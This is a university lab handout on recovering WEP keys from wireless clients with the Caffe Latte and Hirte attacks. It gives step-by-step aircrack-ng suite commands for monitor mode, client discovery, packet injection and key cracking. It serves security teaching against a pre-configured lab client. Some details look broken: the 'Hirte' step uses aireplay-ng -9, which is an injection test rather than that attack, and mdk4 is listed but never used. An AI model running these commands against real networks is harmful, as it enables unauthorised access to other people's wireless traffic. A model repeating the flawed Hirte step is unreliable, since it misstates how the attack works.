
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Caffe Latte & Hirte Attacks on WEP Clients  
**Author:** Dr Ayman El Hajjar  

---

# Lab Activity: Exploiting WEP Clients via Caffe Latte and Hirte Attacks

---

### Objective

This lab demonstrates how attackers can recover a WEP key **from a client device** rather than the access point, using **Caffe Latte** and **Hirte techniques**. These attacks exploit unassociated WEP clients that are configured to auto-connect.

---

## Background

- **Caffe Latte Attack**: Targets WEP clients sending probe requests. The attacker mimics a known SSID and triggers ARP replay from the victim.
- **Hirte Attack**: Similar to Caffe Latte but more aggressive, injecting packets into the victim’s system and collecting encrypted responses.

Both techniques recover WEP keys **without needing the AP**.

---

## Requirements

- A wireless card supporting injection and monitor mode
- A pre-configured WEP client (e.g. Raspberry Pi or laptop)
- Tools: `aircrack-ng`, `mdk4`, `aireplay-ng`, `airodump-ng`

---

## Step-by-Step Instructions

### 1. Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
```

---

### 2. Discover WEP Probe Requests

Use `airodump-ng` to identify clients sending WEP probe requests:

```bash
sudo airodump-ng --encrypt WEP wlan0mon
```

Look for **stations** probing for known SSIDs with encryption WEP.

---

### 3. Run the Caffe Latte Attack

Spoof the target SSID and launch a Caffe Latte session:

```bash
sudo aireplay-ng -6 -b <fake_bssid> -h <client_mac> wlan0mon
```

This will inject packets and try to capture enough IVs for cracking.

---

### 4. Run the Hirte Attack

```bash
sudo aireplay-ng -9 -T 1 -b <fake_bssid> -h <client_mac> wlan0mon
```

This is more aggressive and triggers ARP replay on the client side.

---

### 5. Crack the Captured Packets

```bash
sudo aircrack-ng -b <fake_bssid> hirte-capture*.cap
```

---

## Cleanup

```bash
sudo airmon-ng stop wlan0mon
```

---

## Optional Screenshots

Store in `tasks/img/`:
- airodump-ng showing WEP probe requests
- aireplay-ng session (caffe latte / hirte)
- aircrack-ng output with cracked key

---

## Summary

| Phase     | Tool           | Purpose                                     |
|-----------|----------------|---------------------------------------------|
| Scan      | `airodump-ng`  | Identify WEP clients sending probes         |
| Caffe     | `aireplay-ng`  | ARP replay from client to collect IVs       |
| Hirte     | `aireplay-ng`  | Inject into client and trigger responses    |
| Crack     | `aircrack-ng`  | Recover WEP key from .cap file              |

---
